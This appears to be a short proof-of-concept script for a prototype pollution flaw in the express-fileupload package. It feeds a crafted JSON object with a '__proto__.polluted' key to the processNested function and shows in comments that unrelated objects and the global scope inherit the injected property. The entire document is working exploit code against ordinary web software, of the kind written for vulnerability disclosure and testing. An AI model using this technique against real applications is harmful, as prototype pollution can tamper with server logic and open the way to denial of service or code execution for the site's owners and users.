const _ = require('express-fileupload');

let some_obj = JSON.parse(`{"__proto__.polluted": true}`);
_.processNested(some_obj);

other_obj = {}
console.log(polluted); // true!
console.log(other_obj.polluted); // true!


